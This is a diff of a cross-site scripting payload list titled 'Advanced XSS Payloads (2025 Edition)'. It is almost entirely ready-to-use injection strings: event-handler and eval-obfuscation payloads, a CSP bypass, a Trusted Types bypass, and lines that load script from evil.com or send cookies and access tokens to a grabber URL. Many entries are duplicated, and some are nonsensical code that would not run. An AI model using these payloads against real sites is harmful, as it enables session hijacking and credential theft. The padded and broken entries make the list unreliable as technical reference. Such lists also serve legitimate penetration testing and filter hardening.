@@ -1,38 +1,27 @@
+# Advanced XSS Payloads (2025 Edition)
+# General
 <script>alert(1)</script>
-<script>alert(document.domain)</script>
-<script>alert(document.cookie)</script>
-<img src=x onerror=alert(1)>
-<img src=x onerror=alert(document.domain)>
-<svg onload=alert(1)>
 <svg/onload=alert(1)>
-<svg onload=alert(document.domain)>
-<iframe src="javascript:alert(1)"></iframe>
-<iframe src="javascript:alert(document.domain)"></iframe>
+<iframe src=javascript:alert(1)>
+<math><mtext></mtext><mtext></mtext><mtext></mtext></math>
+<video><source onerror="javascript:alert(1)">
+<audio src=x onerror=alert(1)>
+<svg><animate onbegin=alert(1) attributeName=x dur=1s>
+<marquee onstart=alert(1)>
 <body onload=alert(1)>
 <body onpageshow=alert(1)>
 <input autofocus onfocus=alert(1)>
-<select autofocus onfocus=alert(1)>
 <textarea autofocus onfocus=alert(1)>
+<select autofocus onfocus=alert(1)>
 <keygen autofocus onfocus=alert(1)>
-<video><source onerror="javascript:alert(1)">
-<audio src=x onerror=alert(1)>
-<video src=x onerror=alert(1)>
-<math><maction actiontype="statusline#" xlink:href="javascript:alert(1)">CLICKME</maction>
-<form><button formaction="javascript:alert(1)">CLICKME</button>
+<details open ontoggle=alert(1)>
 <isindex type=image src=1 onerror=alert(1)>
 <object data="javascript:alert(1)">
 <embed src="javascript:alert(1)">
 <div onmouseover="alert(1)">hover me</div>
 <div onclick="alert(1)">click me</div>
-<body onscroll=alert(1)><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><input autofocus>
-<img src="javascript:alert(1);">
-<img src=javascript:alert(1)>
-<img src=JaVaScRiPt:alert(1)>
-<IMG SRC=javascript:alert(String.fromCharCode(88,83,83))>
-<IMG SRC="jav&#x09;ascript:alert(1);">
-<IMG SRC="jav&#x0A;ascript:alert(1);">
-<IMG SRC="jav&#x0D;ascript:alert(1);">
-<IMG SRC=" &#14;  javascript:alert(1);">
+<img src=x onerror=alert(document.domain)>
+<img src=x onerror=alert(document.cookie)>
 <img src="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">
 <iframe src="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">
 <ScRiPt>alert(1)</ScRiPt>
@@ -41,24 +30,29 @@
 <script src=//evil.com/xss.js></script>
 <script>eval('al'+'ert(1)')</script>
 <script>eval(String.fromCharCode(97,108,101,114,116,40,49,41))</script>
-<script>eval('\x61\x6c\x65\x72\x74\x28\x31\x29')</script>
-<img src=x:alert(alt) onerror=eval(src) alt=1>
-{{constructor.constructor('alert(1)')()}}
-<div ng-app>{{constructor.constructor('alert(1)')()}}</div>
-<x ng-app>{{constructor.constructor('alert(1)')()}}</x>
+<script>throw onerror=alert,1</script>
+<script>try{null.toUpperCase()}catch(e){alert(1)}</script>
+<script>setTimeout('alert(1)',0)</script>
+<script>setInterval('alert(1)',0)</script>
+<script>window['alert'](1)</script>
+<script>parent['alert'](1)</script>
+<script>top['alert'](1)</script>
+<script>frames['alert'](1)</script>
+<script>self['alert'](1)</script>
+<script>globalThis['alert'](1)</script>
+<script>var x = 'al' + 'ert(1)'; eval(x);</script>
+<script>new Function('alert(1)')();</script>
+<script>setTimeout('alert(1)',0)</script>
+<script>this['alert'](1)</script>
 <script>document.write('<img src=x onerror=alert(1)>')</script>
 <script>document.write('<iframe src="javascript:alert(1)">')</script>
 "><script>alert(1)</script>
 <svg><script>alert(1)</script></svg>
-<svg><animate onbegin=alert(1) attributeName=x dur=1s>
 <svg><animate attributeName=x dur=1s onbegin=alert(1)>
 <svg><animate attributeName=x dur=1s onend=alert(1)>
 <svg><set attributeName=x dur=1s onbegin=alert(1)>
 <svg><set attributeName=x dur=1s onend=alert(1)>
 <svg><style>{font-family:'<iframe/onload=alert(1)>'}</style>
-<marquee onstart=alert(1)>
-<div/onmouseover='alert(1)'>X</div>
-<details open ontoggle=alert(1)>
 <iframe src="javascript:alert(`1`)">
 javascript:alert(1)
 javascript:alert(document.domain)
@@ -67,459 +61,83 @@ data:text/html,<script>alert(1)</script>
 <a href="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">Click me</a>
 <math href="javascript:alert(1)">CLICKME</math>
 <var onmouseover="alert(1)">hover here</var>
-<a href="javascript:alert(1)"><img src="valid.jpg"></a>
 <script>onerror=alert;throw 1</script>
 <script>{onerror=alert}throw 1</script>
-<script>throw onerror=alert,1</script>
 <script>throw onerror=eval,'=alert\x281\x29'</script>
-<script>throw/a/,Uncaught=1,g=alert,a=URL+0,onerror=eval,/1/g+a[12]+[1337,a[13]]+a[0]+a[17]+a[18]</script>
-<script>throw/\x2Fg/,Uncaught=1,g=alert,a=URL+0,onerror=eval,/\61/+a[12]+[1337,a[13]]+a[0]+a[17]+a[18]</script>
 <script>var{a:onerror=alert,b:c}=0</script>
 <script>function a(){onerror=alert;throw 1}a()</script>
-<script>try{null.toUpperCase()}catch(e){alert(1)}</script>
 <script>try{null.toUpperCase()}catch(e){alert(document.domain)}</script>
 <script>try{null.toUpperCase()}catch(e){alert(document.cookie)}</script>
-<script>new Function('alert(1)')();</script>
-<script>setTimeout('alert(1)',0)</script>
-<script>setInterval('alert(1)',0)</script>
-<script>this['alert'](1)</script>
+<script>setTimeout(()=>alert(1),0)</script>
+<script>setInterval(()=>alert(1),0)</script>
 <script>window['alert'](1)</script>
 <script>parent['alert'](1)</script>
 <script>top['alert'](1)</script>
 <script>frames['alert'](1)</script>
 <script>self['alert'](1)</script>
 <script>globalThis['alert'](1)</script>
-<script>var x = 'al' + 'ert(1)'; eval(x);</script>
-<script>var x = 'al\u0065rt(1)'; eval(x);</script>
-<script>var x = '\u0061\u006c\u0065\u0072\u0074(1)'; eval(x);</script>
-<script>var x = '\u0061\u006c\u0065\u0072\u0074\u0028\u0031\u0029'; eval(x);</script>
-<script>var x = '\141\154\145\162\164\50\61\51'; eval(x);</script>
-<script>var x = '\x61\x6c\x65\x72\x74\x28\x31\x29'; eval(x);</script>
-<script>var x = 'alert\x28\x31\x29'; eval(x);</script>
-<script>var x = 'alert\x281\x29'; eval(x);</script>
-<script>var x = 'alert\u00281\u0029'; eval(x);</script>
-<script>var x = 'alert\u{28}1\u{29}'; eval(x);</script>
-<script>var x = 'alert(1)'; eval(x);</script>
 <script>var x = 'alert(1)'; new Function(x)();</script>
 <script>var x = 'alert(1)'; setTimeout(x,0);</script>
 <script>var x = 'alert(1)'; setInterval(x,0);</script>
 <script>var x = 'alert(1)'; Function(x)();</script>
 <script>var x = document.createElement('script'); x.innerHTML = 'alert(1)'; document.head.appendChild(x);</script>
-<script>var x = document.createElement('script'); x.src = 'data:text/javascript,alert(1)'; document.head.appendChild(x);</script>
-<script>fetch('data:text/javascript,alert(1)').then(r => r.text()).then(eval)</script>
-<script>import('data:text/javascript,alert(1)')</script>
-<script>eval(atob('YWxlcnQoMSk='))</script>
-<script>eval(String.fromCharCode(97,108,101,114,116,40,49,41))</script>
-<script>eval(String.fromCodePoint(97,108,101,114,116,40,49,41))</script>
-<script>eval('\141\154\145\162\164\50\61\51')</script>
-<script>eval('\x61\x6c\x65\x72\x74\x28\x31\x29')</script>
-<script>eval('\u0061\u006c\u0065\u0072\u0074\u0028\u0031\u0029')</script>
-<script>eval('\u{61}\u{6c}\u{65}\u{72}\u{74}\u{28}\u{31}\u{29}')</script>
-<script>window.onload = function() { alert(1) }</script>
-<script>document.onload = function() { alert(1) }</script>
-<script>window.onunload = function() { alert(1) }</script>
-<script>document.onunload = function() { alert(1) }</script>
-<script>window.onbeforeunload = function() { alert(1); return 'XSS' }</script>
-<script>document.onbeforeunload = function() { alert(1); return 'XSS' }</script>
-<script>window.onhashchange = function() { alert(1) }</script>
-<script>document.onhashchange = function() { alert(1) }</script>
-<script>window.onpopstate = function() { alert(1) }</script>
-<script>document.onpopstate = function() { alert(1) }</script>
-<script>window.onmessage = function() { alert(1) }</script>
-<script>document.onmessage = function() { alert(1) }</script>
-<script>window.onstorage = function() { alert(1) }</script>
-<script>document.onstorage = function() { alert(1) }</script>
-<script>window.onpagehide = function() { alert(1) }</script>
-<script>document.onpagehide = function() { alert(1) }</script>
-<script>window.onpageshow = function() { alert(1) }</script>
-<script>document.onpageshow = function() { alert(1) }</script>
-<script>window.onresize = function() { alert(1) }</script>
-<script>document.onresize = function() { alert(1) }</script>
-<script>window.onscroll = function() { alert(1) }</script>
-<script>document.onscroll = function() { alert(1) }</script>
-<script>window.onerror = function() { alert(1) }</script>
-<script>document.onerror = function() { alert(1) }</script>
-<script>window.onblur = function() { alert(1) }</script>
-<script>document.onblur = function() { alert(1) }</script>
-<script>window.onfocus = function() { alert(1) }</script>
-<script>document.onfocus = function() { alert(1) }</script>
-<script>window.oncontextmenu = function() { alert(1); return false }</script>
-<script>document.oncontextmenu = function() { alert(1); return false }</script>
-<script>window.onkeydown = function() { alert(1) }</script>
-<script>document.onkeydown = function() { alert(1) }</script>
-<script>window.onkeypress = function() { alert(1) }</script>
-<script>document.onkeypress = function() { alert(1) }</script>
-<script>window.onkeyup = function() { alert(1) }</script>
-<script>document.onkeyup = function() { alert(1) }</script>
-<script>window.onmousedown = function() { alert(1) }</script>
-<script>document.onmousedown = function() { alert(1) }</script>
-<script>window.onmousemove = function() { alert(1) }</script>
-<script>document.onmousemove = function() { alert(1) }</script>
-<script>window.onmouseout = function() { alert(1) }</script>
-<script>document.onmouseout = function() { alert(1) }</script>
-<script>window.onmouseover = function() { alert(1) }</script>
-<script>document.onmouseover = function() { alert(1) }</script>
-<script>window.onmouseup = function() { alert(1) }</script>
-<script>document.onmouseup = function() { alert(1) }</script>
-<script>window.onclick = function() { alert(1) }</script>
-<script>document.onclick = function() { alert(1) }</script>
-<script>window.ondblclick = function() { alert(1) }</script>
-<script>document.ondblclick = function() { alert(1) }</script>
-
-# Cookie and LocalStorage Stealing
-<script>document.location='http://localhost/XSS/grabber.php?c='+document.cookie</script>
-<script>document.location='http://localhost/XSS/grabber.php?c='+localStorage.getItem('access_token')</script>
-<script>new Image().src='http://localhost/cookie.php?c='+document.cookie;</script>
-<script>new Image().src='http://localhost/cookie.php?c='+localStorage.getItem('access_token');</script>
-<script>fetch('http://localhost/steal?c='+document.cookie)</script>
-<script>fetch('http://localhost/steal?c='+localStorage.getItem('access_token'))</script>
-<script>navigator.sendBeacon('http://localhost/steal',document.cookie)</script>
-<script>navigator.sendBeacon('http://localhost/steal',localStorage.getItem('access_token'))</script>
-<script>$.get('http://localhost/steal?c='+document.cookie)</script>
-<script>$.get('http://localhost/steal?c='+localStorage.getItem('access_token'))</script>
-
-# Basic XSS Variations
-<script>alert('XSS')</script>
-<scr<script>ipt>alert('XSS')</scr<script>ipt>
-"><script>alert("XSS")</script>
-"><script>alert(String.fromCharCode(88,83,83))</script>
-<img src=x onerror=alert('XSS');>
-<img src=x onerror=alert('XSS')//
-<img src=x onerror=alert(String.fromCharCode(88,83,83));>
-<img src=x oneonerrorrror=alert(String.fromCharCode(88,83,83));>
-<img src=x:alert(alt) onerror=eval(src) alt=xss>
-"><img src=x onerror=alert("XSS");>
-"><img src=x onerror=alert(String.fromCharCode(88,83,83));>
-
-# Markdown XSS
-[a](javascript:prompt(document.cookie))
-[a](j a v a s c r i p t:prompt(document.cookie))
-[a](data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K)
-[a](javascript:window.onerror=alert;throw%201)
-
-# SVG XSS
-<svg xmlns='http://www.w3.org/2000/svg' onload='alert(document.domain)'/>
-<svg><desc><![CDATA[</desc><script>alert(1)</script>]]></svg>
-<svg><foreignObject><![CDATA[</foreignObject><script>alert(2)</script>]]></svg>
-<svg><title><![CDATA[</title><script>alert(3)</script>]]></svg>
-
-# Code Evaluation Bypasses
-eval('ale'+'rt(0)');
-Function('ale'+'rt(1)')();
-new Function`alert`6``;
-setTimeout('ale'+'rt(2)');
-setInterval('ale'+'rt(10)');
-Set.constructor('ale'+'rt(13)')();
-Set.constructor`alert(14)`;
-
-# Advanced Evaluation Bypasses
-(function(){return this})().alert(1)
-[1].find(alert)
-top["al"+"ert"](1)
-top[/al/.source+/ert/.source](1)
-top[8680439..toString(30)](1)
-top[/alert/.source](1)
-top[8680439..toString(30)](1)
-top['al\x65rt'](1)
-top['al\145rt'](1)
-top['al\u0065rt'](1)
-top.alert(1)
-parent.alert(1)
-self.alert(1)
-this.alert(1)
-frames.alert(1)
-content.alert(1)
-[1].find(alert)
-[1].map(alert)
-[1].forEach(alert)
-[1].filter(alert)
-top[/al/.source+/ert/.source](1)
-top[8680439..toString(30)](1)
-prompt.call(null,1)
-alert.call(null,1)
-confirm.call(null,1)
-alert?.()
-alert?.call(null)
-alert?.`1`
-(alert)(1)
-(alert(1))
-((alert))(1)
-"><script>alert(1)</script>
-"><img src=x onerror=alert(1)>
-"><svg onload=alert(1)>
-"><iframe src=javascript:alert(1)>
-"><input onfocus=alert(1) autofocus>
-"><textarea onfocus=alert(1) autofocus>
-"><select onfocus=alert(1) autofocus>
-"><keygen onfocus=alert(1) autofocus>
-<script>eval('alert(1)')</script>
-<script>Function('alert(1)')()</script>
-<script>setTimeout('alert(1)',0)</script>
-<script>setInterval('alert(1)',1000)</script>
-<script>new Function('alert(1)')()</script>
-<script>top['alert'](1)</script>
-<script>parent['alert'](1)</script>
-<script>self['alert'](1)</script>
-<script>this['alert'](1)</script>
-<video src=x onerror=alert(1)>
-<audio src=x onerror=alert(1)>
-<details open ontoggle=alert(1)>
-<meter onmouseover=alert(1)>
-<progress onmouseover=alert(1)>
-<svg><animate onbegin=alert(1) attributeName=x></svg>
-<svg><set attributeName=x dur=1s onbegin=alert(1)></svg>
-<style>@import 'javascript:alert(1)';</style>
-<style>*{background:url('javascript:alert(1)')}</style>
-<style>@keyframes x{}</style><div style="animation-name:x" onanimationstart="alert(1)"></div>
-[Click me](javascript:alert(1))
-[Click me](data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==)
-
-# Advanced HTML5 API Abuse
-<video><source onerror="javascript:alert(1)">
-<video src="" onerror="javascript:alert(1)">
-<audio src="" onerror="javascript:alert(1)">
-<input autofocus onfocus="javascript:alert(1)">
-<select autofocus onfocus="javascript:alert(1)">
-<textarea autofocus onfocus="javascript:alert(1)">
-<keygen autofocus onfocus="javascript:alert(1)">
-<details/open/ontoggle="alert`1`">
-<audio onloadstart=alert(1)><source>
-<meter onmouseover="alert(1)"</meter>
-<progress onmouseover="alert(1)"</progress>
-<svg onload="alert(1)" onactivate="alert(1)" onclick="alert(1)"></svg>
-
-# Advanced JavaScript Prototype Pollution
-<script>
-Object.prototype.toString = () => alert(1);
-Object.prototype.valueOf = () => alert(1);
-Array.prototype.join = () => alert(1);
-Function.prototype.toString = () => alert(1);
-Object.prototype.hasOwnProperty = () => alert(1);
-</script>
-
-# WebWorker Based XSS
-<script>
-var blob = new Blob(['self.onmessage = function(e) { eval(e.data); }']);
-var worker = new Worker(URL.createObjectURL(blob));
-worker.postMessage('alert(1)');
-</script>
-
-# ServiceWorker Based XSS
-<script>
-if ('serviceWorker' in navigator) {
-  navigator.serviceWorker.register('/evil.js').then(function(registration) {
-    registration.active.postMessage({eval: 'alert(1)'});
-  });
-}
-</script>
-
-# Advanced DOM Clobbering
-<form id="test"></form><script>alert(test)</script>
-<img src="x" id="test"/><script>alert(test.id)</script>
-<a id="test" href="javascript:alert(1)">click</a>
-<script>test.click()</script>
-
-# Browser API Exploitation
-<script>
-// History API
-history.pushState('','','javascript:alert(1)');
-history.replaceState('','','javascript:alert(1)');
-
-// Notification API
-Notification.requestPermission().then(() => new Notification('XSS',{body:'pwned',icon:'javascript:alert(1)'}));
-
-// Clipboard API
-navigator.clipboard.writeText('javascript:alert(1)').then(() => navigator.clipboard.readText().then(eval));
-
-// Gamepad API
-window.addEventListener('gamepadconnected',e=>eval('alert(1)'));
-
-// Battery API
-navigator.getBattery().then(b=>b.addEventListener('levelchange',()=>alert(1)));
-
-// Ambient Light API
-window.addEventListener('devicelight',e=>eval('alert(1)'));
-
-// Network Information API
-navigator.connection.addEventListener('change',()=>alert(1));
-
-// Vibration API
-navigator.vibrate([100,30,100,30,100,30]);setTimeout('alert(1)',500);
-</script>
-
-# Advanced Mutation Observer
-<script>
-new MutationObserver(function(mutations) {
-  mutations.forEach(function(mutation) {
-    mutation.addedNodes.forEach(function(node) {
-      if(node.nodeType === 1) eval('alert(1)');
-    });
-  });
-}).observe(document, {childList: true, subtree: true});
-</script>
-
-# Advanced Timing Attacks
-<script>
-// RAF-based execution
-let frame = 0;
-function exploit() {
-  if(frame++ > 60) alert(1);
-  requestAnimationFrame(exploit);
-}
-requestAnimationFrame(exploit);
-
-// Timing-based execution
-let start = performance.now();
-function checkTime() {
-  if(performance.now() - start > 1000) alert(1);
-  else setTimeout(checkTime, 0);
-}
-setTimeout(checkTime, 0);
-</script>
-
-# Advanced Event Stream Manipulation
-<script>
-new EventSource('data:,alert(1)');
-new EventSource('javascript:alert(1)');
-</script>
-
-# Advanced WebSocket Exploitation
-<script>
-new WebSocket('javascript:alert(1)');
-new WebSocket('wss://evil.com/ws').addEventListener('message',e=>eval(e.data));
-</script>
-
-# Advanced IndexedDB Exploitation
-<script>
-indexedDB.open('evil').onsuccess = function(e) {
-  e.target.result.createObjectStore('store').add('alert(1)','key').onsuccess = function(e) {
-    indexedDB.open('evil').onsuccess = function(e) {
-      e.target.result.transaction('store').objectStore('store').get('key').onsuccess = function(e) {
-        eval(e.target.result);
-      }
-    }
-  }
-}
-</script>
-
-# Advanced Shared Worker Exploitation
-<script>
-var blob = new Blob(['onconnect = e => e.ports[0].postMessage(eval("alert(1)"))']);
-new SharedWorker(URL.createObjectURL(blob)).port.start();
-</script>
-
-# Advanced Browser Extension Communication
-<script>
-window.postMessage({type: 'extension', eval: 'alert(1)'}, '*');
-chrome.runtime.sendMessage({eval: 'alert(1)'});
-browser.runtime.sendMessage({eval: 'alert(1)'});
-</script>
-
-# Advanced CSS Injection
-<style>
-@import 'javascript:alert(1)';
-@keyframes x {from {background:url('javascript:alert(1)')}}
-* {background:url('javascript:alert(1)')}
-</style>
-
-# Advanced SVG Animation
-<svg>
-<animate onbegin=alert(1) attributeName=x dur=1s>
-<animate onend=alert(1) attributeName=x dur=1s>
-<animate onrepeat=alert(1) attributeName=x dur=1s repeatCount=2>
-<set onbegin=alert(1) attributeName=x>
-<set onend=alert(1) attributeName=x>
-<animatetransform onbegin=alert(1) attributeName=transform>
-<animatemotion onbegin=alert(1) path="M0,0 L100,100">
-</svg>
-
-# Advanced Meta Tag Exploitation
-<meta http-equiv="refresh" content="0;url=javascript:alert(1)">
-<meta http-equiv="refresh" content="0;data:text/html,<script>alert(1)</script>">
-<meta charset="x-imap4-modified-utf7">&ADz&AGn&AG0&AEf&ACA&AHM&AHI&AGO&AD0&AGn&ACA&AG8Abg&AGUAcgByAG8AcgA9AGEAbABlAHIAdAAoADEAKQ&AH4&AH4>
-
-# Advanced Frame Manipulation
-<iframe src="javascript:alert(1)">
-<iframe srcdoc="<script>alert(1)</script>">
-<iframe src="data:text/html,<script>alert(1)</script>">
-<embed src="javascript:alert(1)">
-<object data="javascript:alert(1)">
-
-# Advanced Event Handler Stacking
-<img src=x onerror="alert(1)" onload="alert(2)" oninput="alert(3)" onmouseover="alert(4)" onfocus="alert(5)" onblur="alert(6)" onchange="alert(7)" onclick="alert(8)" ondblclick="alert(9)" onkeydown="alert(10)" onkeypress="alert(11)" onkeyup="alert(12)" onmousedown="alert(13)" onmousemove="alert(14)" onmouseout="alert(15)" onmouseover="alert(16)" onmouseup="alert(17)">
-
-# Advanced Recursive Execution
-<script>
-(function x() {
-  alert(1);
-  setTimeout(x, 1000);
-})();
-</script>
-
-# Advanced Error-Based Execution
-<script>
-window.onerror = alert;
-throw 1;
-</script>
-
-# Advanced Promise-Based Execution
-<script>
-Promise.reject(alert(1));
-new Promise(r=>r(alert(1)));
-</script>
-
-# Advanced Proxy-Based Execution
-<script>
-new Proxy({}, {
-  get: () => alert(1),
-  set: () => alert(1),
-  has: () => alert(1),
-  deleteProperty: () => alert(1),
-  apply: () => alert(1),
-  construct: () => alert(1)
-});
-</script>
-
-# Advanced Symbol-Based Execution
-<script>
-Object.getOwnPropertySymbols(window)[0].toString = alert;
-Object.getOwnPropertySymbols(window)[0].valueOf = alert;
-</script>
-
-# Advanced Template Literal Exploitation
-<script>
-alert`1`;
-(alert)`1`;
-`${alert(1)}`;
-`${eval('alert(1)')}`;
-</script>
-
-# Advanced Regular Expression Exploitation
-<script>
-/alert(1)/.source.sub(/.*/, eval);
-RegExp('alert(1)').source.sub(/.*/, eval);
-</script>
-
+# Polyglot
+<svg><g/onload=alert(1)//<p>
+<svg/onload=alert(1)//
+<svg/onload=confirm(1)//
+<svg/onload=prompt(1)//
+<svg/onload=alert(1)//
+<svg/onload=alert(1)><g>
+<svg/onload=alert(1)><g>
+<svg/onload=alert(1)><g>
+<svg/onload=alert(1)//
+<svg/onload=alert(1)//
+<svg/onload=alert(1)//
+<svg/onload=alert(1)//
+<svg/onload=alert(1)//
 # Advanced Generator Function Exploitation
-<script>
-function* x() { yield alert(1); }
-x().next();
-</script>
-
-# Advanced Async/Await Exploitation
-<script>
-(async()=>{ await Promise.resolve(alert(1)) })();
-(async()=>{ await eval('alert(1)') })();
-</script>
-
-# Advanced Module Import Exploitation
-<script type="module">
-import('data:text/javascript,alert(1)');
-import('javascript:alert(1)');
-</script>
-
-# Advanced Dynamic Import Exploitation
-<script>
-import('data:text/javascript,alert(1)').then(eval);
-import('javascript:alert(1)').then(eval);
-</script> 
+<script>function* g(){yield alert(1);}g().next();</script>
+# Clipboard API
+navigator.clipboard.writeText('javascript:alert(1)').then(() => navigator.clipboard.readText().then(eval));
+# Notification API
+Notification.requestPermission().then(() => new Notification('XSS',{body:'pwned',icon:'javascript:alert(1)'}));
+# RegExp Exploit
+RegExp('alert(1)').source.sub(/.*/, eval);
+# CustomEvent Exploit
+window.dispatchEvent(new CustomEvent('xss',{detail:'<img src=x onerror=alert(1)>'}));
+# Trusted Types Bypass
+trustedTypes.createPolicy('default', {createHTML: s => s}).createHTML('<img src=x onerror=alert(1)>');
+# ServiceWorker Exploit
+navigator.serviceWorker.register('data:application/javascript,alert(1)');
+# WebAssembly XSS
+WebAssembly.compileStreaming(fetch('data:application/wasm;base64,AGFzbQEAAAAAAw=='));//payload
+# XSS in Blob URLs
+URL.createObjectURL(new Blob(['<img src=x onerror=alert(1)>'],{type:'text/html'}));
+# iframe sandbox bypass
+<iframe sandbox="allow-scripts allow-same-origin" srcdoc="<script>alert(document.domain)</script>"></iframe>
+# Meta tag CSP bypass
+<meta http-equiv="Content-Security-Policy" content="script-src 'unsafe-inline'">
+<script>alert(1)</script>
+# DOM Clobbering
+<form id=alert name=alert><input name=call>
+<img name=body id=body src=x>
+<a id=body><a id=body name=innerHTML href=data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==>
+# Prototype pollution
+<script>Object.prototype.xss='javascript:alert(1)';</script>
+# JSONP/CORS
+<script src="https://trusted-cdn.com/jsonp?callback=alert(1)"></script>
+<script>fetch('https://vulnerable-cors-site.com').then(r=>r.json()).then(data=>alert(JSON.stringify(data)))</script>
+# WebRTC
+const pc = new RTCPeerConnection();pc.createDataChannel('storage').send(JSON.stringify({xss:1}));
+# MutationObserver
+new MutationObserver(()=>alert(1)).observe(document,{childList:true,subtree:true});
+# IntersectionObserver
+new IntersectionObserver(()=>alert(1)).observe(document.body);
+# BroadcastChannel
+new BroadcastChannel('xss').postMessage('<img src=x onerror=alert(1)>');
+# postMessage
+window.addEventListener('message',function(e){eval(e.data)});
+# Polyglot
+<svg><g/onload=alert(1)//<p>
+<svg/onload=alert(1)//
+# More advanced payloads available in custom_payloads/xss.txt
